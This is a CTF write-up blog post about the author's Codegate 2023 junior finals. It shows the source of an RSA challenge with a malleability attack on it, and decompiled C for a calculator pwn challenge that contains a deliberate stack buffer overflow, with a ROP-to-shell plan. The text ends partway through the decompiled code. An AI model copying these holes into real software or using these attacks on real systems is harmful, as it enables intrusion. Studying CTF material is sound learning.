    <div class="post-meta"><span title='2023-09-03 09:38:30 +0000 UTC'>September 3, 2023</span>&nbsp;¬∑&nbsp;19 min

</div>
  </header> 
  <div class="post-content"><p><img loading="lazy" src="/codegate23/jnrStage.jpg" alt="Award Ceremony"  />
</p>
<h2 id="overview">Overview<a hidden class="anchor" aria-hidden="true" href="#overview">#</a></h2>
<p>Last week, I traveled to Seoul, Korea to compete in this year&rsquo;s codegate junior finals, and I finished at 8th out of 20 finalists.</p>
<p><img loading="lazy" src="/codegate23/top10.png" alt="Final Leaderboard"  />
</p>
<p>I managed to solve 2 pwns and 1 crypto chall, and this blog post will contain the writeups for all three of them.
All attachments can be found <a href="https://github.com/zhirenliew/ctf/tree/main/codegate_finals23/attachments">here</a>.</p>
<h2 id="backstory">Backstory<a hidden class="anchor" aria-hidden="true" href="#backstory">#</a></h2>
<blockquote>
<p>you can skip this part and go straight to the writeups if you&rsquo;d like to</p>
</blockquote>
<p>The top 20 players from the codegate junior qualifiers were invited to the finals. I performed very badly in the qualifiers, and if I remember correctly I actually was 27th right before the ctf ended. I was pretty dissapointed in myself after the ctf cause I specifically told myself to dive into kernel pwn and windows rev before the qualifiers, but I kept being lazy and in the end I didn&rsquo;t really try them out. And guess what, there was an easy kernel pwn chall and easy windows reversing chall in the qualifiers, which would guarantee me a spot in the finals had I solved any one of them, and I ended up solving none of them simply because I had no experience in any of them.</p>
<p>By the end of the ctf, I finished at 25th <strong>(not because I gained any more points, but because of the whole Hall of Shame thing)</strong>, and the top 25 players were supposed to send them a writeup. I was pretty devastated at this point but I figured I just quickly write the writeup and send it to them for maybe a slight chance of me being able to go to the finals. I wanted to keep the hope alive.</p>
<p>And to my suprise, I got an email from codegate at the end of June asking if I wanted to go to the finals. I was ecstatic and couldn&rsquo;t believe that I actually got this opportunity. I told myself that this was a chance to redeem myself, and to not make the same mistakes I made before. I aimed for top 3, and practiced and learned as much as I could before the finals.</p>
<p>In the end, I got 8th, which is not bad and definitely an improvement, but still I kinda feel like I could&rsquo;ve done a bit better. I was actually 3rd at the last few hours of the ctf, but I guess I didn&rsquo;t push myself hard enough near the end and was a bit too complacent cause I didn&rsquo;t solve anything else afterwards. Had I started working on the misc chall I was working on a bit earlier, maybe I could&rsquo;ve solved it and gotten like top 4. Nevertheless, this was still an incredible experience, and Im very grateful for having this opportunity.</p>
<p>Enough waffling, time to actually get to the writeups.</p>
<h2 id="ezrsa-crypto">ezRSA (crypto)<a hidden class="anchor" aria-hidden="true" href="#ezrsa-crypto">#</a></h2>


<p><details >
  <summary markdown="span"><strong>ezRsa.py</strong></summary>
  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python3" data-lang="python3"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> gmpy2
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> random
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> pathlib
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.PublicKey <span style="color:#f92672">import</span> RSA
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">welcome</span>():
</span></span><span style="display:flex;"><span>    text <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">           ,,                              ,,
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> .M&#34;&#34;&#34;bgd  db                            `7MM              `7MM&#34;&#34;&#34;Mq.   .M&#34;&#34;&#34;bgd      db
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">,MI    &#34;Y                                  MM                MM   `MM. ,MI    &#34;Y     ;MM:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">`MMb.    `7MM  `7MMpMMMb.pMMMb. `7MMpdMAo. MM  .gP&#34;Ya        MM   ,M9  `MMb.        ,V^MM.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  `YMMNq.  MM    MM    MM    MM   MM   `Wb MM ,M&#39;   Yb       MMmmdM9     `YMMNq.   ,M  `MM
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">.     `MM  MM    MM    MM    MM   MM    M8 MM 8M&#34;&#34;&#34;&#34;&#34;&#34;       MM  YM.   .     `MM   AbmmmqMA
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Mb     dM  MM    MM    MM    MM   MM   ,AP MM YM.    ,       MM   `Mb. Mb     dM  A&#39;     VML
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">P&#34;Ybmmd&#34; .JMML..JMML  JMML  JMML. MMbmmd&#39;.JMML.`Mbmmd&#39;     .JMML. .JMM.P&#34;Ybmmd&#34; .AMA.   .AMMA.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                                  MM
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                                .JMML.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    print(text)
</span></span><span style="display:flex;"><span>    rsa_key <span style="color:#f92672">=</span> RSA<span style="color:#f92672">.</span>generate(<span style="color:#ae81ff">1024</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> rsa_key
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_int_length</span>(num:int):
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">import</span> math
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> int(math<span style="color:#f92672">.</span>ceil(num<span style="color:#f92672">.</span>bit_length() <span style="color:#f92672">/</span> <span style="color:#ae81ff">8</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">RSAencrypt</span>(plaintext:bytes, e:int, N:int):
</span></span><span style="display:flex;"><span>    int_plaintext <span style="color:#f92672">=</span> int<span style="color:#f92672">.</span>from_bytes(plaintext, <span style="color:#e6db74">&#39;big&#39;</span>)
</span></span><span style="display:flex;"><span>    ciphertext <span style="color:#f92672">=</span> pow(int_plaintext, e, N)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> ciphertext<span style="color:#f92672">.</span>to_bytes(get_int_length(ciphertext),<span style="color:#e6db74">&#39;big&#39;</span>)<span style="color:#f92672">.</span>hex()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">RSAdecrypt</span>(ciphertext:bytes, d:int, N:int):
</span></span><span style="display:flex;"><span>    int_ciphertext <span style="color:#f92672">=</span> int<span style="color:#f92672">.</span>from_bytes(ciphertext, <span style="color:#e6db74">&#39;big&#39;</span>)
</span></span><span style="display:flex;"><span>    message <span style="color:#f92672">=</span> pow(int_ciphertext, d, N)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> message<span style="color:#f92672">.</span>to_bytes(get_int_length(message), <span style="color:#e6db74">&#39;big&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">action_seeflag</span>(key):
</span></span><span style="display:flex;"><span>    flagfile <span style="color:#f92672">=</span> pathlib<span style="color:#f92672">.</span>Path(<span style="color:#e6db74">&#34;/home/ctf/flag&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open (flagfile, <span style="color:#e6db74">&#39;r&#39;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>        flag <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> flag<span style="color:#f92672">.</span>encode()<span style="color:#f92672">.</span>hex()<span style="color:#f92672">.</span>encode()
</span></span><span style="display:flex;"><span>    result <span style="color:#f92672">=</span> RSAencrypt(data, key<span style="color:#f92672">.</span>e, key<span style="color:#f92672">.</span>n)
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;FLAG is </span><span style="color:#e6db74">{</span>result<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">action_encrypt</span>(key:RSA<span style="color:#f92672">.</span>RsaKey):
</span></span><span style="display:flex;"><span>    user_inp <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;write plain text(hex string format): &#34;</span>)
</span></span><span style="display:flex;"><span>    userInput_hex <span style="color:#f92672">=</span> bytes<span style="color:#f92672">.</span>fromhex(user_inp)
</span></span><span style="display:flex;"><span>    result <span style="color:#f92672">=</span> RSAencrypt(userInput_hex, key<span style="color:#f92672">.</span>e, key<span style="color:#f92672">.</span>n)
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[*] Done! Here is!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74"> </span><span style="color:#e6db74">{</span>result<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">action_decrypt</span>(key):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    ciphertext <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;write ciphertext with hex string format: &#34;</span>)
</span></span><span style="display:flex;"><span>    flagfile <span style="color:#f92672">=</span> pathlib<span style="color:#f92672">.</span>Path(<span style="color:#e6db74">&#34;/home/ctf/flag&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open (flagfile, <span style="color:#e6db74">&#39;r&#39;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>        cmp_flag <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> cmp_flag<span style="color:#f92672">.</span>encode()<span style="color:#f92672">.</span>hex()<span style="color:#f92672">.</span>encode()
</span></span><span style="display:flex;"><span>    userInput_hex <span style="color:#f92672">=</span> bytes<span style="color:#f92672">.</span>fromhex(ciphertext)
</span></span><span style="display:flex;"><span>    decrypted_data <span style="color:#f92672">=</span> RSAdecrypt(userInput_hex, key<span style="color:#f92672">.</span>d, key<span style="color:#f92672">.</span>n)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(RSAencrypt(data, key<span style="color:#f92672">.</span>e, key<span style="color:#f92672">.</span>n) <span style="color:#f92672">==</span> ciphertext):
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;Don&#39;t decrypt encrpted flag...&#34;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[*] decrypt result =&gt; </span><span style="color:#e6db74">{</span>decrypted_data<span style="color:#f92672">.</span>hex()<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>(rsakey):
</span></span><span style="display:flex;"><span>    action <span style="color:#f92672">=</span> int(input(<span style="color:#e6db74">&#34;1. encrypt</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">2. decrypt</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">3. see top secret</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">4. exit</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&gt; &#34;</span>))
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> action <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
</span></span><span style="display:flex;"><span>        action_encrypt(rsakey)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> action <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span>:
</span></span><span style="display:flex;"><span>        action_decrypt(rsakey)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> action <span style="color:#f92672">==</span> <span style="color:#ae81ff">3</span>:
</span></span><span style="display:flex;"><span>        action_seeflag(rsakey)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> action <span style="color:#f92672">==</span> <span style="color:#ae81ff">4</span>:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;byebye!&#34;</span>)
</span></span><span style="display:flex;"><span>        sys<span style="color:#f92672">.</span>exit()
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;Invalid input!!&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
</span></span><span style="display:flex;"><span>    initkey <span style="color:#f92672">=</span> welcome()
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">100000</span>):
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">You can encrypt / decrypt with my SIMPLE RSA!&#34;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>: main(initkey)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
</span></span><span style="display:flex;"><span>            print(e)
</span></span></code></pre></div>
</details></p>

<p>You can see the encrypted flag, and can encrypt and decrypt any message except for the encrypted flag. A quick google search showed me this <a href="https://github.com/pberba/ctf-solutions/tree/master/20181223_xmasctf/crypto-328-santas_list_(2.0)">writeup</a>.</p>
<p>Since RSA is <a href="https://en.wikipedia.org/wiki/Malleability_(cryptography)">malleable</a>, we could produce a ciphertext in a way such that the decrypted plaintext is related to the flag.</p>
<p>From the <a href="https://github.com/pberba/ctf-solutions/tree/master/20181223_xmasctf/crypto-328-santas_list_(2.0)">writeup</a>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>ct_flag     = encrypt(flag)  = flag^e     mod n
</span></span><span style="display:flex;"><span>ct_two      = encrypt(2)     = 2^e        mod n
</span></span><span style="display:flex;"><span>ct_not_flag = ct_flag*ct_two = (flag*2)^e mod n
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>decrypted(ct_not_flag) = flag*2
</span></span></code></pre></div><h2 id="calc-pwn">calc (pwn)<a hidden class="anchor" aria-hidden="true" href="#calc-pwn">#</a></h2>
<p><strong>checksec</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>    Arch:     amd64-64-little
</span></span><span style="display:flex;"><span>    RELRO:    Full RELRO
</span></span><span style="display:flex;"><span>    Stack:    No canary found
</span></span><span style="display:flex;"><span>    NX:       NX enabled
</span></span><span style="display:flex;"><span>    PIE:      PIE enabled
</span></span></code></pre></div><p><strong>note()</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">note</span>(<span style="color:#66d9ef">void</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">ssize_t</span> sVar1;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> buf [<span style="color:#ae81ff">44</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> local_c;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memset</span>(buf,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0x20</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Note&gt; &#34;</span>);
</span></span><span style="display:flex;"><span>  sVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>,buf,<span style="color:#ae81ff">0x100</span>);
</span></span><span style="display:flex;"><span>  local_c <span style="color:#f92672">=</span> (<span style="color:#66d9ef">int</span>)sVar1;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (buf[local_c <span style="color:#f92672">+</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;\n&#39;</span>) {
</span></span><span style="display:flex;"><span>    buf[local_c <span style="color:#f92672">+</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;\0&#39;</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memcpy</span>(notepad,buf,(<span style="color:#66d9ef">long</span>)local_c);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Notepad: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,notepad);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>There is an obvious buffer overflow here. With stack canaries off, we just need a leak of either PIE or libc to just ROP and get shell.</p>


<p><details >
  <summary markdown="span"><strong>calc()</strong></summary>
  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">calc</span>(<span style="color:#66d9ef">void</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">size_t</span> sVar1;
</span></span><span style="display:flex;"><span>  undefined8 uVar2;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memset</span>(expression,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0x100</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Formula&gt; &#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fgets</span>(expression,<span style="color:#ae81ff">0x100</span>,stdin);
</span></span><span style="display:flex;"><span>  sVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>(expression);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (notepad[sVar1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xff</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;\n&#39;</span>) {
</span></span><span style="display:flex;"><span>    sVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>(expression);
</span></span><span style="display:flex;"><span>    notepad[sVar1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xff</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  uVar2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">evaluateExpression</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Result&gt; %ld</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,uVar2);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">long</span> <span style="color:#a6e22e">evaluateExpression</span>(<span style="color:#66d9ef">void</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// ghidra showed more vars here but I deleted them to make it cleaner here
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">long</span> local_988 [<span style="color:#ae81ff">256</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> local_188 [<span style="color:#ae81ff">264</span>];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memset</span>(local_188,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0x100</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memset</span>(local_988,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0x800</span>);
</span></span><span style="display:flex;"><span>  operatorTop <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  operandTop <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">do</span> {
</span></span><span style="display:flex;"><span>    uVar6 <span style="color:#f92672">=</span> <span style="color:#a6e22e">SEXT48</span>(i);
</span></span><span style="display:flex;"><span>    sVar4 <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>(expression);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (sVar4 <span style="color:#f92672">&lt;=</span> uVar6) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">while</span> (<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;</span> operatorTop) {
</span></span><span style="display:flex;"><span>        lVar5 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">long</span>)operatorTop;
</span></span><span style="display:flex;"><span>        local_21 <span style="color:#f92672">=</span> local_188[lVar5];
</span></span><span style="display:flex;"><span>        iVar1 <span style="color:#f92672">=</span> operandTop <span style="color:#f92672">+</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>        local_30 <span style="color:#f92672">=</span> local_988[operandTop];
</span></span><span style="display:flex;"><span>        operandTop <span style="color:#f92672">=</span> operandTop <span style="color:#f92672">+</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>;
</span></span><span style="display:flex;"><span>        local_38 <span style="color:#f92672">=</span> local_988[iVar1];
</span></span><span style="display:flex;"><span>        operatorTop <span style="color:#f92672">=</span> operatorTop <span style="color:#f92672">+</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>        local_40 <span style="color:#f92672">=</span> <span style="color:#a6e22e">calculate</span>(local_38,local_30,(<span style="color:#66d9ef">int</span>)local_188[lVar5],local_30);
</span></span><span style="display:flex;"><span>        operandTop <span style="color:#f92672">=</span> operandTop <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>        local_988[operandTop] <span style="color:#f92672">=</span> local_40;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> local_988[operandTop];
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    local_41 <span style="color:#f92672">=</span> expression[i];
</span></span><span style="display:flex;"><span>    ppuVar3 <span style="color:#f92672">=</span> <span style="color:#a6e22e">__ctype_b_loc</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (((<span style="color:#f92672">*</span>ppuVar3)[local_41] <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x800</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (local_41 <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;(&#39;</span>) {
</span></span><span style="display:flex;"><span>        operatorTop <span style="color:#f92672">=</span> operatorTop <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>        local_188[operatorTop] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;(&#39;</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (local_41 <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;)&#39;</span>) {
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">while</span> ((<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;</span> operatorTop <span style="color:#f92672">&amp;&amp;</span> (local_188[operatorTop] <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;(&#39;</span>))) {
</span></span><span style="display:flex;"><span>            lVar5 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">long</span>)operatorTop;
</span></span><span style="display:flex;"><span>            local_61 <span style="color:#f92672">=</span> local_188[lVar5];
</span></span><span style="display:flex;"><span>            iVar1 <span style="color:#f92672">=</span> operandTop <span style="color:#f92672">+</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>            local_70 <span style="color:#f92672">=</span> local_988[operandTop];
</span></span><span style="display:flex;"><span>            operandTop <span style="color:#f92672">=</span> operandTop <span style="color:#f92672">+</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>;
</span></span><span style="display:flex;"><span>            local_78 <span style="color:#f92672">=</span> local_988[iVar1];
</span></span><span style="display:flex;"><span>            operatorTop <span style="color:#f92672">=</span> operatorTop <span style="color:#f92672">+</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>            local_80 <span style="color:#f92672">=</span> <span style="color:#a6e22e">calculate</span>(local_78,local_70,(<span style="color:#66d9ef">int</span>)local_188[lVar5],local_70);
</span></span><span style="display:flex;"><span>            operandTop <span style="color:#f92672">=</span> operandTop <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>            local_988[operandTop] <span style="color:#f92672">=</span> local_80;
</span></span><span style="display:flex;"><span>          }
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> ((<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;</span> operatorTop) <span style="color:#f92672">&amp;&amp;</span> (local_188[operatorTop] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;(&#39;</span>)) {
</span></span><span style="display:flex;"><span>            operatorTop <span style="color:#f92672">=</span> operatorTop <span style="color:#f92672">+</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>          }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> ((((local_41 <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;+&#39;</span>) <span style="color:#f92672">||</span> (local_41 <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;-&#39;</span>)) <span style="color:#f92672">||</span> (local_41 <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;*&#39;</span>)) <span style="color:#f92672">||</span>
</span></span><span style="display:flex;"><span>             ((local_41 <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;/&#39;</span> <span style="color:#f92672">||</span> (local_41 <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;^&#39;</span>)))) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">while</span> (<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;</span> operatorTop) {
</span></span><span style="display:flex;"><span>              iVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">getPriority</span>((<span style="color:#66d9ef">int</span>)local_188[operatorTop]);
</span></span><span style="display:flex;"><span>              iVar2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">getPriority</span>((<span style="color:#66d9ef">int</span>)local_41);
</span></span><span style="display:flex;"><span>              <span style="color:#66d9ef">if</span> (iVar1 <span style="color:#f92672">&lt;</span> iVar2) <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>              lVar5 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">long</span>)operatorTop;
</span></span><span style="display:flex;"><span>              local_42 <span style="color:#f92672">=</span> local_188[lVar5];
</span></span><span style="display:flex;"><span>              iVar1 <span style="color:#f92672">=</span> operandTop <span style="color:#f92672">+</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
